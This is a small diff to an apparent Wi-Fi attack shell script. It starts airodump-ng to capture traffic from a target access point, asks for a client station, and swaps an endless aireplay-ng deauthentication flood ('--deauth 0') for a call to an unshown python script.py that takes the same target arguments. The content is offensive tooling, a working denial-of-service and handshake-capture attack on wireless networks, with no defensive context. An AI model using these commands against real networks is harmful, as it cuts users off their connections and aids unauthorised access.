@@ -4,4 +4,5 @@
 xterm -e airodump-ng $3 --bssid $1 --channel $2 &
 echo "Enter Station: "
 read station
-aireplay-ng --deauth 0 -a $1 -c $station $3
+xterm -e python script.py $3 $1 $station
+
